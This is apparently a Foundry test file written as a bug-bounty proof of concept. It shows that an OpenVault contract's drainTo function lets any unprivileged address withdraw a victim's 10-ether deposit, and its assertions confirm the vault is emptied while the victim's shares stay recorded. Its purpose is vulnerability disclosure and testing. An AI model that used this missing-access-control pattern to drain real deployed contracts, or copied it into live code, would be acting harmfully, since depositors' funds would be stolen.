// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {OpenVault} from "../OpenVault.sol";

/// Executed proof that drainTo is permissionless theft.
/// Fixture demo — Immunefi still wants a fork PoC against live state.
contract OpenVaultDrainTest is Test {
    OpenVault vault;
    address victim = address(0xA11CE);
    address attacker = address(0xB0B);

    function setUp() public {
        vault = new OpenVault();
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function test_unprivileged_drainTo_steals_victim_deposit() public {
        uint256 before = attacker.balance;
        vm.prank(attacker);
        vault.drainTo(attacker);
        assertEq(address(vault).balance, 0, "vault not empty");
        assertEq(attacker.balance - before, 10 ether, "attacker profit");
        assertEq(vault.shares(victim), 10 ether, "shares still credited; insolvent books");
    }
}
